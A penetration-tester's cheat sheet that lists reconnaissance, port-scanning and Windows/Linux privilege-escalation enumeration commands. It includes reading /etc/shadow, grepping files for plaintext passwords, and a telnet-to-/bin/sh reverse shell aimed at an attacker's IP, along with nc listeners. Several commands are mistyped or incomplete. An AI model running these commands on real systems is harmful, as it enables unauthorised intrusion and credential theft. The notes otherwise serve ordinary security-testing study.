# Passive Information Gathering

### Physical
    Satellite images
    Drone recon
    Building layout
        badge Readers
        break Areas
        security
        fencing

### Job Information
    Employees
        name
        job title
        phone number
        position
    Pictures
        badge photos
        desk photos
        computer photos
        linkedin
        twitter

### Web
    Target Validation
        WHOIS
        nslookup
        IP Addresses
      
### Subdomains
    google
        site:company.com -www
        filetype:csv
        intitle:"sensitive data"
    dig
        nmap
        sublist3r
        bluto
        crt.sh
      
### Finger printing
    wappalyzer
    whatweb
    builtwith
      
### Databreaches
    HaveIbeenPwned
    BreachParse
    WeLeakInfo
    ghostproject.fr

Email addresses
   email pattern
      etc. firstname.lastname@company.com
   theHarvester


# Active Information Gathering



### Port Scans

#### full port scan
    nmap -A -t4 -p- 10.10.10.10 -oA scanName

#### port 21 ftp
    ftp <ip_address>
    check for anoymous login

#### port 22 ssh

#### port 80/443 http/https
    nikto -h http://10.10.10.10/
    dirbuster
    gobuster

#### port 135 rpc

#### port 139/445 SMB
    enum4linux -a 10.10.10.10
    smbclient -L \\\\10.10.10.10\\

### Exploit lookup
google version exploits
searchsploit version


# Windows Privelege Escalation

## *Information Gathering*

### OS info
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

### Hostname
    hostname

### User Accounts

    net users
    net uset <userid>

### Network Info

    ipconfig /all
    route print
    arp -A
    netstat -ano
    netsh firewall show state
    netsh firewall show config

### What's running

    schtask /query /fo LIST /v
    tasklist /SVC
    net start
    DRIVEQUERY

# Linux Privelege Escalation




## *Information Gathering*

### *Automatic Information Gathering*
    linenum.sh

### Operating System

#### Distribution type and version
    cat /etc/
    cat /etc/*-release
    cat /etc/lsb-release      # Debian based
    cat /etc/redhat-release   # Redhat based

#### Kernel Version
    cat /proc/version
    uname -a
    uname -mrs
    rpm -q kernel
    dmesg | grep Linux
    ls /boot | grep vmlinuz-

#### Environmental Variables
    cat /etc/profile
    cat /etc/bashrc
    cat ~/.bash_profile
    cat ~/.bashrc
    cat ~/.bash_logout
    env
    set
        
#### Printer
    lpstat -a
    
### Application and Services

#### Services
    ps aux
    ps -ef
    top
    cat /etc/services
#### Root Services
    ps aux | grep root
    ps -ef | grep root
    
#### Applications installed, versions, currently running
    ls -alh /usr/bin/
    ls -alh /sbin/
    dpkg -l
    rpm -qa
    ls -alh /var/cache/apt/archivesO
    ls -alh /var/cache/yum/
    
#### Service(s) settings
    cat /etc/syslog.conf
    cat /etc/chttp.conf
    cat /etc/lighttpd.conf
    cat /etc/cups/cupsd.conf
    cat /etc/inetd.conf
    cat /etc/apache2/apache2.conf
    cat /etc/my.conf
    cat /etc/httpd/conf/httpd.conf
    cat /opt/lampp/etc/httpd.conf
    ls -aRl /etc/ | awk '$1 ~ /^.*r.*/

#### Jobs
    crontab -l
    ls -alh /var/spool/cron
    ls -al /etc/ | grep cron
    ls -al /etc/cron*
    cat /etc/cron*
    cat /etc/at.allow
    cat /etc/at.deny
    cat /etc/cron.allow
    cat /etc/cron.deny
    cat /etc/crontab
    cat /etc/anacrontab
    cat /var/spool/cron/crontabs/root

#### Plaintext passwords
    grep -i user [filename]
    grep -i pass [filename]
    grep -C 5 "password" [filename]
    find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
    grep -irE '(password|pwd|pass)[[:space:]]*=[[:space:]]*[[:alpha:]]+' *

#### Hashed passwords
    cat /etc/shadow

## Communications and Networking

### NIC installation, connection
    /sbin/ifconfig -a
    cat /etc/network/interfaces
    cat /etc/sysconfig/network

### Network config
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname

### Users and hosts
    lsof -i
    lsof -i :80
    grep 80 /etc/services
    netstat -antup
    netstat -antpx
    netstat -tulpn
    chkconfig --list
    chkconfig --list | grep 3:on
    last
    w
    cat /etc/passwd

### Cached IP and MAC addresses
    arp -e
    route
    /sbin/route -nee

### Packet Sniffing
    tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]

### Shell Interaction
    nc -lvp 4444    # Attacker. Input (Commands)
    nc -lvp 4445    # Attacker. Ouput (Results)
    telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!

## Confidental Information and Users

# Web Server
    python -m SimpleHttpServer